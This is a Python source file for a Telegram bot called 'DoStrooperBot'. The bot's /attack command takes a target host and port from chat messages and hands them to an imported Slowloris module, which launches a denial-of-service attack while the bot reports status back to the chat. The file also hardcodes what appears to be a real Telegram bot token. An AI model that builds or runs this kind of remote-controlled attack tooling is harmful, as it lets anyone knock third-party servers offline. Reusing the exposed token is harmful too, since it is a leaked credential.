from gevent import monkey
monkey.patch_all()

import logging
import argparse
from telegram.ext import Updater, CommandHandler, MessageHandler, Filters
import ipaddress
from argument_parser import parse_arguments
import attackerSlowloris
import os

os.environ["GEVENT_SUPPORT"] = 'True'

logging.basicConfig(
    format = '%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level = logging.INFO,
    filename = 'attacker_bot.log'
)

logger = logging.getLogger("DoStrooperBot")

def start(update, context):
    context.bot.send_message(chat_id = update.effective_chat.id, text = "Initializing bot")

def attack(update, context):
    from io import StringIO
    import sys
    old_stdout = sys.stdout
    sys.stdout = local_stdout = StringIO()
    old_stderr = sys.stderr
    sys.stderr = local_stderr = StringIO()

    logger.info("attack data")
    try:
        args = parse_arguments(context.args)
        # Make attack
        context.bot.send_message(chat_id = update.effective_chat.id, text = "Attacking target")
        attack_text = "Host: " + str(args.host) + "\nPort: " +  str(args.port)
        context.bot.send_message(chat_id = update.effective_chat.id, text = attack_text)
        # Le forwardeamos los argumentos al slowLoris para que empiece el ataque
        attackerSlowloris.attack(args)

    except SystemExit:
        logger.info("Command error: " + " ".join(context.args))
        err_str = local_stdout.getvalue() + local_stderr.getvalue()
        logger.info("ERROR: " + err_str)
        err_arr = err_str.split('\n')
        for err in err_arr:
            context.bot.send_message(chat_id = update.effective_chat.id, text = err)

    sys.stdout = old_stdout
    sys.stderr = old_stderr

def channelMessagesHandler(update, context):
    command = update.effective_message.text.split()
    if command[0] == '/attack':
        context.args = command[1:]
        attack(update, context)
    if command[0] == '/start':
        start(update, context)

def is_a_valid_port(port):
    port_number = int(port)
    return 0 <= port_number <= 65535

def is_ipv4(ip_string):
    try:
        ipaddress.IPv4Network(ip_string)
        return True
    except ValueError:
        return False

def is_a_valid_command(command_string):
    return command_string in ['slowloris', 'any', 'random']

def init_bot():
    botname = 'DoStrooperBot'
    bot_token = '893363660:AAHesuFwhNcJz1K8zRJ3v6wJXCE4tv00r4s'
    logger.info("initializing bot")
    updater = Updater(token = bot_token, use_context = True)
    dispatcher = updater.dispatcher


    start_handler = CommandHandler('start', start)
    dispatcher.add_handler(start_handler)
    attack_handler = CommandHandler('attack', attack)
    dispatcher.add_handler(attack_handler)
    channel_handler = MessageHandler(Filters.command, channelMessagesHandler)
    dispatcher.add_handler(channel_handler)
    updater.start_polling()

if __name__ == '__main__':
    init_bot()
